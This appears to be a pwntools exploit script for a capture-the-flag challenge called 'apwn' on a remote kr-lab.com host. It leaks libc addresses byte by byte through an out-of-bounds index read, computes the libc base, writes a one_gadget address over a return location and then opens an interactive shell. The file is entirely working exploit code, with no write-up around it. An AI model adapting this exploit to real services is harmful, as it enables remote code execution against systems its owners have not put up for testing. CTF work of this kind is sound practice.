from pwn import*
elf=ELF("./apwn")
context.log_level="debug"

local=0
if local:
	p=process("./apwn")
	lib=ELF("./libc-2.23_64.so")
	onegadget=0xf1147
	pause()

else:
	p=remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com",57856)
	lib=ELF("./libc.so")	
	onegadget=0xf1147

def li(index,contant):   #canary r 44
	p.sendlineafter("index",str(index))
	p.recvuntil("hex) ")
	leak=p.recvuntil("\n")
	if int(leak[0:2],16)==0xff:
		leak=int(leak[6:8],16)
	else:
		leak=int(leak[0:2],16)
	info("leak: 0x%x",leak)
	p.sendlineafter("value",str(contant))
	return leak

p.sendlineafter("name","a")
leak=li(632,1)
leak+=li(633,1)<<8
leak+=li(634,1)<<16
leak+=li(635,1)<<24
leak+=li(636,1)<<32
leak+=li(637,1)<<40
info("libc_main: 0x%x",leak-0xf0)

offest=leak-0xf0-lib.symbols["__libc_start_main"]
onegadget=onegadget+offest
info("onegadget: %x",onegadget)

li(349,onegadget>>40)
li(348,(onegadget&0xffffffffff)>>32)
li(347,(onegadget&0xffffffff)>>24)
li(346,(onegadget&0xffffff)>>16)
li(345,(onegadget&0xffff)>>8)
li(344,(onegadget&0xff))

count = 28
while (count >= 0):
	li(0,0)
	count=count-1
p.sendlineafter("?","")	
p.sendline("icq86493b24e94ce9087805e9d809b13")
	
p.interactive()
	
	
